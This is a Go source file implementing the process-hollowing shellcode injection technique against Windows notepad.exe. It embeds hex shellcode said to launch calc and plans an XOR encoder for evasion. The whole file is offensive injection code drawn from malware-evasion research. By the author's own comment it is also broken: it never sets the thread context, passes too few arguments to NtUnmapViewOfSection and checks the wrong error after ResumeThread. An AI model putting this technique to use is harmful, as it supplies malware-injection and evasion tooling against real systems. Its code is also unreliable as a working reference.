/*
	@saulpanders
	Process hollowing shellcode injection technique

	currently pops shellcode for calc


	METHOD:

			1. Start new process in suspended state by calling CreateProcess w/ CREATE_SUSPENDED (0x4)
			2. Unmap memory allocated for proc w/ NtUnmapViewOfSection
			3. Allocate space in memory for payload using VirtualAllocEx
			4. Inject payload into memory at allocated region w/ WriteProcessMemory
			5. Change execution point of target process to start on payload w/ GetThreadContext
			6. Resume target process execution by calling ResumeThread


	TODO:

		XOR encoder for shellcode
		Refactor code to "functions"

	BUILD:

		go build processhollowing.go -o goProcessHollowing.exe

		I like to use notepad to test

		///SHIT IS BROKEN FIX LATER (NO THREAD CONTEXT DATA STRUCT, MORE RESEARCH NEEDED)


	inspired by https://www.deepinstinct.com/2019/09/15/malware-evasion-techniques-part-1-process-injection-and-manipulation/

*/

package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

const (
	CREATE_SUSPENDED = 0x00000004

	PROCESS_CREATE_THREAD     = 0x0080
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_READ           = 0x0010
	PROCESS_VM_WRITE          = 0x0020

	CREATE_THREAD_ACCESS = (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	MEM_COMMIT  = 0x00001000
	MEM_RESERVE = 0x00002000

	MEM_PERMISSIONS = (MEM_COMMIT | MEM_RESERVE)

	PAGE_READWRITE          = 0x04
	PAGE_EXECUTE_READ       = 0x20
	PAGE_READ_WRITE_EXECUTE = 0x40

	CREATE_NO_WINDOW = 0x08000000

	THREAD_SET_CONTEXT = 0x0010

	CONTEXT_i386    = 0x10000
	CONTEXT_INTEGER = (CONTEXT_i386 | 0x02)
)

type FLOATING_SAVE_AREA struct {
	ControlWord  uint
	StatusWord   uint
	TagWord      uint
	ErrorOffset  uint
	DataOffset   uint
	DataSelector uint
	RegisterArea uint
	Cr0NpxState  uint
}

type CONTEXT struct {
	//retrieved by CONTEXT_DEBUG_REGISTER
	ContextFlags uint
	Dr0          uint
	Dr1          uint
	Dr2          uint
	Dr3          uint
	Dr4          uint
	Dr5          uint
	Dr6          uint
	Dr7          uint
	//retrieved by CONTEXT_FLOATING_POINT
	FloatSave FLOATING_SAVE_AREA
	//retrieved by CONTEXT_SEGMENTS
	segGs uint
	segFs uint
	segEs uint
	segDs uint
	//retrieved by CONTEXT_INTEGER
	Edi uint
	Esi uint
	Ebx uint
	Edx uint
	Ecx uint
	Eax uint
	//retrieved by CONTEXT_CONTROL
	Ebp    uint
	Eip    uint
	SegCs  uint
	EFlags uint
	Esp    uint
	SegSs  uint
	//retrieved by CONTEXT_EXTENDED REGISTERS
	ExtendedRegisters []byte
}

func main() {

	//ARGS

	verbose := flag.Bool("verbose", false, "Enable verbose output")
	flag.Parse()

	//Pop Calc Shellcode - SOLID SHELLCODE POC
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	//import libraries
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	GetThreadContext := kernel32.NewProc("GetThreadContext")

	NtUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")

	var si windows.StartupInfo
	var pi windows.ProcessInformation
	var psec windows.SecurityAttributes
	var tsec windows.SecurityAttributes

	//create suspended process - CreateProcess
	argv := syscall.StringToUTF16Ptr("C:\\WINDOWS\\system32\\notepad.exe")
	errCreateProcess := windows.CreateProcess(argv, nil, &psec, &tsec, false, CREATE_SUSPENDED, nil, nil, &si, &pi)

	if errCreateProcess != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully created a process with PID: %d", pi.ProcessId))
	}

	//unmapping memory - NtUnmapViewOfSection
	_, _, errNtUnmapViewOfSection := NtUnmapViewOfSection.Call(uintptr(pi.Process))

	if errNtUnmapViewOfSection != nil && errNtUnmapViewOfSection.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling NtUnmapViewOfSection:\r\n%s", errNtUnmapViewOfSection.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully unmapped memory in %d", pi.ProcessId))

	}

	//Allocating memory in process - VirtualAllocEx
	addr, _, errVirtualAllocEx := VirtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), MEM_PERMISSIONS, PAGE_READ_WRITE_EXECUTE)

	if errVirtualAllocEx != nil && errVirtualAllocEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAllocEx:\r\n%s", errVirtualAllocEx.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", pi.ProcessId))
	}

	//Writing shellcode into allocated memory - WriteProcessMemory
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pi.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", pi.ProcessId))

	}

	var cntx CONTEXT
	cntx.ContextFlags = CONTEXT_INTEGER

	//getting current thread context (to resume) GetThreadContext
	_, _, errGetThreadContext := GetThreadContext.Call(uintptr(pi.Thread), (uintptr)(unsafe.Pointer(&cntx)))

	if errGetThreadContext != nil && errGetThreadContext.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling GetThreadContext:\r\n%s", errGetThreadContext.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully got thread context  %d", pi.ProcessId))

	}

	//resuming thread
	_, errResumeThread := windows.ResumeThread(pi.Thread)
	if errCreateProcess != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully resumed thread in: %d", pi.ProcessId))
	}

}
